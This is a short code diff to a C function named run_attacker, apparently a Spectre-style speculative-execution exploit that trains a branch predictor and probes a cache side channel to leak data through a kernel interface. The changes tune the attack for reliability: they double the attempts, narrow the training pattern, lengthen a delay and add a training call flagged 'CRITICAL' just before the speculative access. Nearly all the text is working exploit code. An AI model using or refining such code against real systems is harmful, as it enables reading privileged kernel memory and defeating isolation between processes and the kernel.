@@ -52,7 +52,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
         int scores[256] = {0};
 
-        for (int attempt = 0; attempt < 500; attempt++) {
+        for (int attempt = 0; attempt < 1000; attempt++) {
 
             // Touch all pages to warm up TLB
             for (int i = 0; i < 256; i++) {
@@ -61,7 +61,7 @@ int run_attacker(int kernel_fd, char *shared_memory) {
 
             // 1. TRAIN branch predictor
             for (int i = 0; i < 100; i++) {
-                call_kernel_part3(kernel_fd, shared_memory, i % 8);
+                call_kernel_part3(kernel_fd, shared_memory, i % 4);
             }
 
             // 2. FLUSH probe array
@@ -70,7 +70,10 @@ int run_attacker(int kernel_fd, char *shared_memory) {
             }
 
             mfence();
-            usleep(10);
+            usleep(50);
+
+            // 🔥 CRITICAL: one more training right before attack
+            call_kernel_part3(kernel_fd, shared_memory, 0);
 
             // 3. SPECULATIVE call
             call_kernel_part3(kernel_fd, shared_memory, current_offset);
